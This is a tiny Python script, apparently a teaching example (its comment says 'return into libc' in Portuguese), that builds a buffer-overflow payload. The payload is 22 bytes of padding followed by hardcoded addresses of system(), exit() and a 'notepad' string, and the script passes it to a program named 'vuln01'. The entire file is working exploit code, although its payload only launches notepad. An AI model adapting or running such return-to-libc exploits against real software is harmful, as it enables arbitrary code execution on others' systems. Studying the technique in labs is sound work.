#!/bin/python
#exemplo return into libc
from subprocess import call

#0x7712b177 -> system()
#0x7713b2e0 -> exit()
#0x402015  -> string "notepad"


string =  "a"*22 + "\x77\xb1\x12\x77" +"\xe0\xb2\x13\x77"+"\x14\x20\x40" 
call(["vuln01", string])